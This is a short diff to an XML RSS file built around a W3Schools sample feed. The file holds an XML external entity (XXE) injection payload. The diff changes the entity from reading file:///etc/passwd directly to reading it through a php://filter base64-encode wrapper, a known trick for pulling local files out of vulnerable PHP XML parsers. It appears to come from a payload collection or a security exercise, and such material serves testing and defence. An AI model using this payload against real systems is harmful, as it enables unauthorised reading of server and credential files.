@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <rss version="2.0">
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]>
 <channel>
   <title>W3Schools Home Page</title>
   <link>https://www.w3schools.com</link>
